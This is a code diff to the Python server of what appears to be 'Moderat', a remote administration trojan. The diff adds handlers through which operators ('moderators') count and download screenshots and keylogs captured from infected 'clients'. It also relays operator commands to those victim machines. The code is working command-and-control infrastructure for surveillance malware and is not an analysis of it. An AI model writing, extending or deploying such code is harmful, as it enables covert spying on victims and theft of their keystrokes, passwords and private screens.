@@ -4,6 +4,7 @@ import sys
 import string
 import random
 import ast
+import os
 import datetime
 
 from twisted.internet.protocol import Protocol, ServerFactory
@@ -55,6 +56,11 @@ class ModeratServerProtocol(Protocol):
     def __init__(self):
 
         self.__buffer__ = ''
+
+        # dicts for download
+        self.screenshots_dict = {}
+        self.keylogs_dict = {}
+        self.audio_dict = {}
 
     # New Connection Made
     def connectionMade(self):
@@ -251,6 +257,54 @@ class ModeratServerProtocol(Protocol):
             log.info('Set Alias %s For %s' % (alias_value, data['mode']))
             manageClients.set_alias(alias_client, alias_value)
 
+        elif data['mode'] == 'countScreenshots':
+            client_id, date = data['payload'].split()
+            not_downloaded = manageScreenshots.get_screenshots_count_0(client_id, date)
+            downloaded = manageScreenshots.get_screenshots_count_1(client_id, date)
+            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countScreenshots')
+            log.info('Screenshots Count Sent to Moderator')
+
+        elif data['mode'] == 'countKeylogs':
+            client_id, date = data['payload'].split()
+            not_downloaded = manageKeylogs.get_keylogs_count_0(client_id, date)
+            downloaded = manageKeylogs.get_keylogs_count_1(client_id, date)
+            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countKeylogs')
+            log.info('Keylogs Count Sent to Moderator')
+
+        # TODO: Download Screenshots
+        elif data['mode'] == 'downloadScreenshots':
+            client_id, date, filter_downloaded = data['payload'].split()
+            if int(filter_downloaded) == 1:
+                screenshots_list = manageScreenshots.get_all_new_screenshots(client_id, date)
+            else:
+                screenshots_list = manageScreenshots.get_all_screenshots(client_id, date)
+            if len(screenshots_list) > 0:
+                screenshots_names = []
+                for screenshot in screenshots_list:
+                    if os.path.exists(screenshot[2]):
+                        self.screenshots_dict[screenshot[1]] = {}
+                        self.screenshots_dict[screenshot[1]]['datetime'] = screenshot[1]
+                        self.screenshots_dict[screenshot[1]]['raw'] = open(screenshot[2], 'rb').read()
+                        self.screenshots_dict[screenshot[1]]['window_title'] = screenshot[3]
+                        self.screenshots_dict[screenshot[1]]['date'] = screenshot[4]
+                        screenshots_names.append(screenshot[1])
+                    else:
+                        log.info('File Not Found Delete Entry (%s)' % screenshot[2])
+                        manageScreenshots.delete_screenshot(screenshot[1])
+                # Send Data Count
+                self.send_message_to_moderator(self, screenshots_names, len(screenshots_list))
+            else:
+                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
+
+        elif data['mode'] == 'downloadScreenshot':
+            screenshot_name = data['payload']
+            if self.screenshots_dict.has_key(screenshot_name):
+                self.send_message_to_moderator(self, self.screenshots_dict[screenshot_name], 'downloadScreenshot')
+                manageScreenshots.set_screenshot_viewed(self.screenshots_dict[screenshot_name]['datetime'])
+                del self.screenshots_dict[screenshot_name]
+            else:
+                self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
+
         # ADMIN PRIVILEGES
         # Get Moderators List
         elif data['mode'] == 'getModerators' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
@@ -278,26 +332,13 @@ class ModeratServerProtocol(Protocol):
             manageClients.set_moderator(client_id, moderator_id)
             log.info('Moderator Changed For Client (%s) to (%s)' % (client_id, moderator_id))
 
-        elif data['mode'] == 'countScreenshots':
-            client_id, date = data['payload'].split()
-            not_downloaded = manageScreenshots.get_screenshots_count_0(client_id, date)
-            downloaded = manageScreenshots.get_screenshots_count_1(client_id, date)
-            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countScreenshots')
-            log.info('Screenshots Count Sent to Moderator')
-
-        elif data['mode'] == 'countKeylogs':
-            client_id, date = data['payload'].split()
-            not_downloaded = manageKeylogs.get_keylogs_count_0(client_id, date)
-            downloaded = manageKeylogs.get_keylogs_count_1(client_id, date)
-            self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countKeylogs')
-            log.info('Keylogs Count Sent to Moderator')
-
-
         # Send Commands To Clients
         elif data.has_key('mode'):
-            print data
-            log.info('Send Message to %s from %s' % (data['to'], data['from']))
-            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+            try:
+                log.info('Send Message to %s from %s' % (data['to'], data['from']))
+                self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+            except KeyError:
+                pass
 
         else:
             return
